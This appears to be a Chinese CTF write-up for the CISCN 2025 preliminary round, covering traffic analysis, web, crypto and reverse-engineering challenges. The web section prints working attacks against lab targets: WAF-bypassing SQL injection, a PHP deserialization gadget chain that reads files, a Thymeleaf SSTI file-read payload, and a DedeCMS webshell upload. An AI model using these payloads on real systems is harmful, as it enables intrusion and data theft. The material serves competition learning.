---
title: "ciscn 2025 初赛 WP by Yp0int"
onlyTitle: true
date: 2025-12-20 19:30:21
categories:
- ctf
- WP
tags:
- CTF
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8188.jpg
---



# ciscn 2025 初赛 WP by Yp0int

## 流量分析

### SnakeBackdoor1

_ws.col.info == "POST /admin/login HTTP/1.1  (application/x-www-form-urlencoded)"追踪爆破流的最后一个，为zxcvbnm123

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228151755150.png)

登录后重定向到了/admin/panel

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152234688.png)

在这个路由先探测了一下ssti

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152439747.png)

追踪这条流有ssti的payload

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152534714.png)

拿去Base64解码看到是zlib文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152720423.png)



### SnakeBackdoor2

前面找到{{config}}，跟进其相应包，里面有secret-key

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228165255152.png)



## web

### AI_WAF

利用/*!50000*/绕过关键字

获取表名

```Plain
'  /*!50000union*/ /*!50000select*/ 1,2,/*!50000group_concat(table_name)*/ from /*!50000information_schema.tables*/ where /*!50000table_schema*/=\"nexadata\"  -- -
```

获取字段名，这里好像对获取字段名的格式做了检测，对上述获取表名的payload稍作修改后发现可以在后面加个||去绕过

```Plain
'  /*!50000union*/ /*!50000select*/ 1,2,/*!50000group_concat(column_name)*/ from /*!50000information_schema.columns*/ where /*!50000table_name*/=\"nexadata\" || /*!50000table_name*/=\"where_is_my_flagggggg\"  -- -
```

获取flag

```Plain
' /*!50000union*/ /*!50000select*/ 1,2,Th15_ls_f149 from where_is_my_flagggggg -- -
```



### hellogate

抓包发现图片最后有代码

```PHP
<?php
error_reporting(0);
class A {
    public $handle;
    public function triggerMethod() {
        echo "" . $this->handle; 
    }
}
class B {
    public $worker;
    public $cmd;
    public function __toString() {
        return $this->worker->result;
    }
}
class C {
    public $cmd;
    public function __get($name) {
        echo file_get_contents($this->cmd);
    }
}
$raw = isset($_POST['data']) ? $_POST['data'] : '';
header('Content-Type: image/jpeg');
readfile("muzujijiji.jpg");
highlight_file(__FILE__);
$obj = unserialize($_POST['data']);
$obj->triggerMethod();
```

观察发现反序列化链为

```Plain
A::triggerMethod --> B::__toString --> C::__get --> 实现伪协议读取文件
<?php
error_reporting(0);
class A {
    public $handle;
    public function triggerMethod() {
        echo "" . $this->handle; 
    }
}
class B {
    public $worker;
    public $cmd;
    public function __toString() {
        return $this->worker->result;
    }
}
class C {
    public $cmd;
    public function __get($name) {
        echo file_get_contents($this->cmd);
    }
}

$a = new A();
$b = new B();
$c = new C();

$a->handle=$b;
$b->worker=$c;
$b->cmd="php://filter/convert.base64-encode/resource=/flag";

echo serialize($a);
O:1:"A":1:{s:6:"handle";O:1:"B":2:{s:6:"worker";O:1:"C":1:{s:3:"cmd";s:49:"php://filter/convert.base64-encode/resource=/flag";}s:3:"cmd";N;}}
```



### redjs

next.js漏洞

[CVE-2025-55182/poc.py at main · msanft/CVE-2025-55182 · GitHub](https://github.com/msanft/CVE-2025-55182/blob/main/poc.py)

### dedecms

注册后发现用户Aa123456789，拆测账密为Aa123456789/Aa123456789，后新建档案文档部分发现上传点/dede/archives_do.php，进行文件上传修改MIME类型成功上传木马

执行命令即可

### ezjava

admin/admin123登录

禁用了 new 和表示的T，只能用静态方法的Thymeleaf ssti

https://xz.aliyun.com/news/14953

其实就是类似fastjson 1.2.68 commons-io写文件

题目说了禁用全部命令，让读文件

copyToString可以接收InputStream，返回成字符。重要的是他是static方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228163010585.png)

那么可以构造如下去调用copyToString

```
[[${''.getClass.forName("org.springframework.util.StreamUtils").getMethod("copyToString", ''.getClass.forName("java.io.InputStream"), ''.getClass.forName("java.nio.charset.Charset"))}]]
```

刚好URI有一个static方法create，避免了调用构造函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228163528548.png)

#strings是spEL的内置表达式，不然直接用String类不能传字符串。加入toURL().openStream()转为InputStream

```
''.getClass.forName("java.net.URI").getMethod("create", ''.getClass.forName("java.lang.String")).invoke(null, #strings.concat("file:///")).toURL().openStream()
```

Charset随便传参数，找AI生成一个能用的实参

```
''.getClass.forName("java.nio.charset.StandardCharsets").getField("UTF_8").get(null))}]]
```

poc：

```
[[${''.getClass.forName("org.springframework.util.StreamUtils").getMethod("copyToString", ''.getClass.forName("java.io.InputStream"), ''.getClass.forName("java.nio.charset.Charset")).invoke(null, ''.getClass.forName("java.net.URI").getMethod("create", ''.getClass.forName("java.lang.String")).invoke(null, #strings.concat("file:///")).toURL().openStream(), ''.getClass.forName("java.nio.charset.StandardCharsets").getField("UTF_8").get(null))}]]
```

列目录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228162324516.png)

flag_y0u_d0nt_kn0w

flag被过滤了，concat直接绕过就行了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228162856254.png)





## Crypto

### ECDSA

```Python
#!/usr/bin/env python3
from ecdsa import SigningKey, NIST521p
from hashlib import sha512
from Crypto.Util.number import long_to_bytes
import random
import binascii
import sys

digest_int = int.from_bytes(sha512(b"Welcome to this challenge!").digest(), "big")
curve_order = NIST521p.order
priv_int = digest_int % curve_order
priv_bytes = long_to_bytes(priv_int, 66)
sk = SigningKey.from_string(priv_bytes, curve=NIST521p)
vk = sk.verifying_key

f_pub = open("public.pem", "wb")
f_pub.write(vk.to_pem())
f_pub.close()

def nonce(i):
    seed = sha512(b"bias" + bytes([i])).digest()
    k = int.from_bytes(seed, "big")
    return k

msgs = [b"message-" + bytes([i]) for i in range(60)]
sigs = []

for i, msg in enumerate(msgs):
    k = nonce(i)
    sig = sk.sign(msg, k=k)
    sigs.append((binascii.hexlify(msg).decode(), binascii.hexlify(sig).decode()))

f_sig = open("signatures.txt", "w")
for m, s in sigs:
    f_sig.write("%s:%s\n" % (m, s))
f_sig.close()
```

注意私钥产生的方式

```Python
digest_int = int.from_bytes(sha512(b"Welcome to this challenge!").digest(), "big")
from hashlib import sha512, md5
from ecdsa import NIST521p

d = int.from_bytes(sha512(b"Welcome to this challenge!").digest(), "big") % NIST521p.order
print(md5(str(d).encode()).hexdigest())
```

### EzFlag

1. 程序流程概览

程序首先要求用户输入密码 V3ryStr0ngp@ssw0rd。验证通过后，程序进入 Flag 生成逻辑。

Flag 的格式为 flag{...}，其中花括号内的内容由 32 个字符组成，并在特定位置（第 7, 12, 17, 22 个字符后）插入连字符 -。

1. 核心生成算法

程序通过一个循环（i 从 0 到 31）生成每一位字符：

调用函数 f(v11)：根据当前的 v11 值计算出一个索引，从查找表 K 中获取对应字符。

更新 v11：v11 的更新公式为 v11 = v11 * 8 + i + 64。注意 v11 是 64 位无符号整数，计算时会发生溢出截断。

插入分隔符：在特定索引位置插入 -。

1. 函数 f 分析 (斐波那契数列)

函数 f(a1) 的逻辑如下：

初始化 v5 = 0, v4 = 1。

循环 a1 次，执行斐波那契数列的迭代计算：

循环结束后，返回 K[v5]。

结论：函数 f(a1) 返回的是 斐波那契数列第 a1 项模 16 的值作为索引，在字符串 K 中查找对应的字符。

1. 关键数据

查找表 K：在初始化函数中被赋值为 "012ab9c3478d56ef"。

初始值：v11 初始为 1。

通过分析，原始算法中 f(a1) 计算的是斐波那契数列的第 a1 项模 16 的值。由于 a1 在主循环中呈指数级增长（每次乘以 8），直接模拟计算会导致运行时间过长。

我们可以利用斐波那契数列模 mm 的周期性（Pisano Period）来优化算法。

 对于模数 m=16m=16，其 Pisano 周期为 24。

 这意味着 Fn(mod16)=Fn(mod24)(mod16)Fn(mod16)=Fn(mod24)(mod16)。

因此，我们可以将 f(a1) 中的循环次数从 a1 优化为 a1 % 24，这将极大地减少计算

```Python
K = "012ab9c3478d56ef"

def f(a1):
    # Optimization: Fibonacci sequence modulo 16 has a period of 24 (Pisano period)
    # So F(n) mod 16 == F(n % 24) mod 16
    a1 = a1 % 24
    
    v5 = 0
    v4 = 1
    for _ in range(a1):
        v2 = v4
        v4 = (v5 + v4) & 0xF
        v5 = v2
    return K[v5]

def generate_flag():
    v11 = 1
    flag = "flag{"
    for i in range(32):
        c = f(v11)
        flag += c
        if i in [7, 12, 17, 22]:
            flag += "-"
        
        v11 = v11 * 8 + i + 64
        v11 &= 0xFFFFFFFFFFFFFFFF
        
    flag += "}"
    print(flag)

if __name__ == "__main__":
    generate_flag()
def find_pisano_period(m):
    a, b = 0, 1
    for i in range(m * m):
        a, b = b, (a + b) % m
        if a == 0 and b == 1:
            return i + 1
    return None

period = find_pisano_period(16)
print(f"Pisano period for mod 16 is: {period}")
```

### RSA_NestingDoll

Pollard's p-1算法的实现，用于分解RSA模数

```Python
from gmpy2 import powmod, gcd, is_prime, next_prime
from Crypto.Util.number import long_to_bytes
import random

k = 2
N = 484831124108275939341366810506193994531550055695853253298115538101629337644848848341479419438032232339003236906071864005366050185096955712484824249228197577223248353640366078747360090084446361275032026781246854700074896711976487694783856878403247312312487197243272330518861346981470353394149785086635163868023866817552387681890963052199983782800993485245670437818180617561464964987316161927118605512017355921555464359512280368738197370963036482455976503266489446554327046948670215814974461717020804892983665655107351050779151227099827044949961517305345415735355361979690945791766389892262659146088374064423340675969505766640604405056526597458482705651442368165084488267428304515239897907407899916127394598273176618290300112450670040922567688605072749116061905175316975711341960774150260004939250949738836358264952590189482518415728072191137713935386026127881564386427069721229262845412925923228235712893710368875996153516581760868562584742909664286792076869106489090142359608727406720798822550560161176676501888507397207863998129261472631954482761264406483807145805232317147769145985955267206369675711834485845321043623959730914679051434102698588945009836642922614296598336035078421463808774940679339890140690147375340294139027290793
c = 657984921229942454933933403447729006306657607710326864301226455143743298424203173231485254106370042482797921667656700155904329772383820736458855765136793243316671212869426397954684784861721375098512569633961083815312918123032774700110069081262242921985864796328969423527821139281310369981972743866271594590344539579191695406770264993187783060116166611986577690957583312376226071223036478908520539670631359415937784254986105845218988574365136837803183282535335170744088822352494742132919629693849729766426397683869482842748401000853783134170305075124230522253670782186531697976487673160305610021244587265868919495629
n = 16141229822582999941795528434053604024130834376743380417543848154510567941426284503974843508505293632858944676904777719167211264225017879544879766461905421764911145115313698529148118556481569662427943129906246669392285465962009760415398277861235401144473728421924300182818519451863668543279964773812681294700932779276119980976088388578080667457572761731749115242478798767995746571783659904107470270861418250270529189065684265364754871076595202944616294213418165898411332609375456093386942710433731450591144173543437880652898520275020008888364820928962186107055633582315448537508963579549702813766809204496344017389879

outer_factors = []

a = pow(2, n, N)

while True:
    # 累积指数
    a = powmod(a, k, N)

    # 避免陷入平凡子群
    if a == 1:
        k = 2
        a = pow(random.randint(2, N - 2), n, N)
        continue

    g = gcd(a - 1, N)

    if g != 1 and g != N:
        outer_factors.append(g)
        N //= g

        if is_prime(N):
            outer_factors.append(N)
            break

    k = next_prime(k)

small_primes = []
tmp = k
while tmp.bit_length() == 20:
    small_primes.append(tmp)
    tmp = next_prime(tmp)

p1, p2, p3, p4 = outer_factors
inner_primes = [
    gcd(p1 - 1, n),
    gcd(p2 - 1, n),
    gcd(p3 - 1, n),
    gcd(p4 - 1, n)
]

p, q, r, s = inner_primes
phi = (p - 1) * (q - 1) * (r - 1) * (s - 1)
d = pow(65537, -1, phi)

m = pow(c, d, n)
print(long_to_bytes(m))
```



## re

### wasm-login

release.wasm.map存在部分代码

```
export declare function __visit(ptr: usize, cookie: u32): void;\n","// The entry file of your WebAssembly module.\n\nimport { init, update, final } from \"./sha256\";\nimport { encode } from \"./base64\";\n\nexport function add(a: i32, b: i32): i32 {\n  return a + b;\n}\n/**\n * 执行完整的登录认证流程：\n * 1. 对密码进行Base64编码\n * 2. 获取当前时间戳\n * 3. 构建JSON消息\n * 4. 使用HMAC-SHA256进行签名\n * 5. 返回最终的JSON字符串\n*/\nexport function authenticate(username: string, password: string): string {\n  // 1. Base64编码密码\n  const encodedPassword = encode(stringToUint8Array(password));\n  //console.log(encodedPassword);\n  // 2. 获取当前时间戳（毫秒）\n  const timestamp = Date.now().toString();\n  //console.log(timestamp);\n  // 3. 构建原始JSON消息\n  const message = `{\"username\":\"${username}\",\"password\":\"${encodedPassword}\"}`;\n  //console.log(message);\n  // 4. 使用HMAC-SHA256签名\n  const signature = signMessage(message, timestamp);\n  //console.log(signature);\n  // 5. 构建最终的JSON消息\n  const finalMessage = `{\"username\":\"${username}\",\"password\":\"${encodedPassword}\",\"signature\":\"${signature}\"}`;\n  \n  return finalMessage;\n  //return \"ok\";\n}\n\nfunction stringToUint8Array(str: string): Uint8Array {\n  const arr = new Uint8Array(str.length);\n  for (let i = 0; i < str.length; ++i) {\n    arr[i] = str.charCodeAt(i);\n  }\n  return arr;\n}
```

用户名和密码位于html的注释中（admin/admin）

根据题目提示，需要爆破正确的时间戳，且范围位于2025-12-14到2025-12-15间，

```js
import { createHash } from 'crypto';
import { authenticate, currentDate1 } from "./build/release.js";

const TARGET_PREFIX = "ccaf33e3512e31f3";

const hashData = (data) => {
    return createHash('md5').update(data).digest('hex');
};

const runAuthLoop = async (username, password) => {
    console.log("Starting authentication loop...");

    while (true) {
        const authResult = authenticate(username, password);
        
        const authData = JSON.parse(authResult);
        const checksum = hashData(JSON.stringify(authData));
        const currentTimestamp = currentDate1.thing;

        if (currentTimestamp % LOG_INTERVAL === 0) {
            console.log(`Timestamp: ${currentTimestamp} (${new Date(currentTimestamp).toISOString()})`);
        }

        if (checksum.startsWith(TARGET_PREFIX)) {
            console.log(`Checksum: ${checksum}`);
            console.log(`Timestamp: ${currentTimestamp} (${new Date(currentTimestamp).toISOString()})`);
			break;
		}
	}
};

await runAuthLoop("admin", "admin");
```



### babygame

运行程序发现是godot开发的，找godot逆向工具https://github.com/GDRETools/gdsdecomp

解包之后可以看到gd后缀的代码文件，在flag.gd中存在加密方式和密文

```js
extends CenterContainer

@onready var flagTextEdit: Node = $PanelContainer / VBoxContainer / FlagTextEdit
@onready var label2: Node = $PanelContainer / VBoxContainer / Label2

static var key = "FanAglFanAglOoO!"
var data = ""

func _on_ready() -> void :
    Flag.hide()

func get_key() -> String:
    return key

func submit() -> void :
    data = flagTextEdit.text

    var aes = AESContext.new()
    aes.start(AESContext.MODE_ECB_ENCRYPT, key.to_utf8_buffer())
    var encrypted = aes.update(data.to_utf8_buffer())
    aes.finish()

    if encrypted.hex_encode() == "d458af702a680ae4d089ce32fc39945d":
        label2.show()
    else:
        label2.hide()

func back() -> void :
    get_tree().change_scene_to_file("res://scenes/menu.tscn")
```

但是在另一个代码文件中还存在修改密钥的代码

```js
extends Node

@onready var fan = $"../Fan"

var score = 0

func add_point():
    score += 1
    if score == 1:
        Flag.key = Flag.key.replace("A", "B")
        fan.visible = true
```

修复密钥之后，解题代码如下：

```python
from Crypto.Cipher import AES
import binascii

key = b"FanBglFanBglOoO!"
ciphertext_hex = "d458af702a680ae4d089ce32fc39945d"
ciphertext = binascii.unhexlify(ciphertext_hex)

cipher = AES.new(key, AES.MODE_ECB)
plaintext = cipher.decrypt(ciphertext)

print(f"Decrypted bytes: {plaintext}")
```

